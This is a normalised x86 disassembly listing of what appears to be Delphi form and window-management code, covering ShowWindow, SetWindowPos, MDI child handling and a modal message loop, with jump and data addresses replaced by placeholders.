cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_4441b8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4544c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454ad3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_459410
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x4
xor edx edx
push ebp
push sub_454ab6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454abd
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_454987
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_454580
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x4
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4534a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov eax [ rw-data ]
call sub_455f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43bab4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_443be8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_455f48
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43baf8
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_455f6c
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
call sub_44e4b8
mov ebx eax
mov eax [ rw-data ]
call sub_455f60
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_455f6c
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_455f84
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43bab4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_455f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax esi
call sub_4506d8
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_455f60
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43c3a8
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_455f78
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43baf8
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_455f48
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
add ebx eax
mov eax esi
call sub_4506f8
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
call sub_452394
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_455f6c
cmp ebx eax
jge r-xdata
adc esi 0x0
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
test esi esi
jge r-xdata
xor ebx ebx
mov eax [ rw-data ]
call sub_455f60
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_455f6c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_455f60
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_452394
jmp r-xdata
sub_454585
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4589e0
call sub_404854
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_455f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43bab4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_455f48
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43baf8
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x7
jne r-xdata
mov eax [ rw-data ]
call sub_455f6c
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ rw-data ]
call sub_455f60
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_455f6c
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_455f84
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43bab4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_455f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax esi
call sub_4506d8
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_455f60
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454abd
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43c3a8
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_455f78
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43baf8
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_455f48
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
add ebx eax
mov eax esi
call sub_4506f8
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
call sub_452394
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_455f6c
cmp ebx eax
jge r-xdata
adc esi 0x0
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
test esi esi
jge r-xdata
xor ebx ebx
mov eax [ rw-data ]
call sub_455f60
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_455f6c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_455f60
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_452394
jmp r-xdata
sub_45498c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4589e0
call sub_404854
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4534a4
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_443be8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454abd
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
call sub_44e4b8
mov ebx eax
sub_454b0c
push ebx
mov ebx eax
mov eax ebx
call sub_444ff0
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
sub_454b64
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423438
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454bc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_454bd0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffa5
call sub_404160
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454bfc
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x358 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
mov [ ebx + 0x294 ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x270 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_458970
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffad
call sub_404160
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_454d9c
jmp r-xdata
mov eax ebx
call sub_454e78
mov dl 0x1
mov eax ebx
call sub_452354
jmp r-xdata
sub_454ca0
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_451ae0
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_451b2c
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
sub_454d04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454d71
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
movzx eax [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_404160
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_454e78
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_454dbc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_454e3b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x276 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454e42
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov eax ebx
call sub_443f88
test al al
jne r-xdata
mov eax ebx
call sub_453378
sub_454e48
push ebx
mov ebx eax
mov [ ebx + 0x344 ] edx
xor eax eax
mov [ ebx + 0x340 ] eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax ebx
call sub_440ab4
pop ebx
retn
mov eax ebx
call sub_4408ec
pop ebx
retn
sub_454e94
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455186
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43a664
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4575b4
xor edx edx
push ebp
push sub_455169
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x330 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
jne r-xdata
call GetActiveWindow
mov [ ebp - 0x1c ] eax
call sub_44e274
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_416844
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
movzx eax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_456478
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44e358
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_455147
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_454da4
xor edx edx
push ebp
push sub_4550a6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
mov eax [ rw-data ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x294 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4408ec
mov eax [ ebp - 0x4 ]
call sub_443bc4
call GetCapture
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x294 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454d04
mov eax [ rw-data ]
call sub_4586f0
mov eax [ rw-data ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_443be8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4550ad
mov eax [ ebp - 0x4 ]
call sub_454d9c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4550ad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455151
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_456478
movzx edx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_456478
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4167c0
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_416964
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44e41c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
call sub_44e27c
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_455198
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455198
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_455208
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
